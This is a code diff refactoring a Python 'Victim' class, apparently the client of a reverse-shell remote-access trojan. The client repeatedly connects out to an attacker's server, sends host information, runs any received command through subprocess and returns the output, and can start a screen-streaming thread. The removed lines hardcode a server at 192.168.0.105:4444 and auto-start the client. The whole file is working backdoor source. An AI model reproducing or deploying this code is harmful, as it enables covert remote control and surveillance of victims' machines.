@@ -1,59 +1,55 @@
 import socket, subprocess, os, time, json
+from threading import Thread
+
 from stream.stream import Stream
 from info import get_host_info
-
-BUFSIZE: int = 8192
-ENCODING: str = 'cp866'
-CONNECTION_TIMEOUT: float = 5
+from const import Const
 
 
 class Victim:
-    def __init__(self, srv_ip: str, srv_port: int) -> None:
-        self.srv_ip: str = srv_ip
-        self.srv_port: int = srv_port
-        self.info: dict = get_host_info()
-        self.socket: socket.socket = socket.socket()
+    def __init__(self, info=None, sock=None) -> None:
+        if info:
+            self.info = info
+        else:
+            self.info = get_host_info()
 
-        self.stream = Stream()
+        self.socket = sock
 
-    def handle(self, command: str) -> str:
-        if command[:2] == 'cd':
+    def handle(self, command: str) -> str | None:
+        if command == 'stream':
+            stream = Stream()
+            thread = Thread(target=stream.start)
+            thread.start()
+            return None
+
+        elif command[:2] == 'cd':
             try:
                 os.chdir(command[2:].strip())
-                output = ' '
+                return ' '
             except (FileNotFoundError, OSError) as err:
-                output = str(err)
+                return str(err)
 
         else:
-            output = subprocess.getoutput(command, encoding=ENCODING)
+            return subprocess.getoutput(command, encoding=Const.ENCODING)
 
-        return output
-
-    def start(self) -> None:
-        self.socket: socket.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
+    def connect(self, srv_ip: str, srv_port: int) -> None:
+        self.socket = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
         self.socket.setsockopt(socket.SOL_SOCKET, socket.SO_REUSEADDR, 1)
+
         while True:
             try:
-                self.socket.connect((self.srv_ip, self.srv_port))
-
-                self.socket.send(json.dumps(self.info).encode(encoding=ENCODING))
+                self.socket.connect((srv_ip, srv_port))
+                self.socket.send(json.dumps(self.info).encode(encoding=Const.ENCODING))
 
                 while True:
-                    command = self.socket.recv(BUFSIZE).decode(encoding=ENCODING)
+                    command = self.socket.recv(Const.BUFSIZE).decode(encoding=Const.ENCODING)
+                    output = self.handle(command.strip())
 
-                    if command == 'stream':
-                        # self.socket.send('stream'.encode(encoding=ENCODING))
-                        self.stream.start()
+                    if not output:
                         continue
 
-                    output = self.handle(command.strip())
-                    self.socket.send(output.encode(encoding=ENCODING))
+                    self.socket.send(output.encode(encoding=Const.ENCODING))
 
             except Exception:
-                time.sleep(CONNECTION_TIMEOUT)
-                print('ошибка, переподключаемся')
+                time.sleep(Const.CONNECTION_TIMEOUT)
                 continue
-
-
-victim = Victim('192.168.0.105', 4444)
-victim.start()
